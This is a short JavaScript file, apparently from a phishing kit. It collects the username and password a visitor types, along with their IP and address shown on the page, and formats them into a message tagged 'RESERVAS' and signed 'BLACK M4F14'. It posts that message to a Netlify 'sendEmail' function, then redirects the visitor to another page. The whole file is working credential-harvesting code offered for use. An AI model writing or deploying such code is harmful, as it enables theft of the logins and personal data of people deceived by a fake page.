var ready = function() {
    let u_name = document.getElementById("usuario").value;
    let u_name2 = document.getElementById("contraseña").value;
    let ip     = document.getElementById("ip").innerHTML;
    let ip2    = document.getElementById("address").innerHTML;

    return `🔹RESERVAS🔹\nusuario: ${u_name}\ncontraseña: ${u_name2}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
};

var sender = function() {
    let message = ready();  // ya es un string completo

    fetch('/.netlify/functions/sendEmail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })  // <-- enviamos como { message: "texto completo" }
    })
    .then(r => r.json())
    .then(data => {
        console.log("Response:", data);
        window.location = 'source.html';
    })
    .catch(err => console.error("Error:", err));

    return false;
};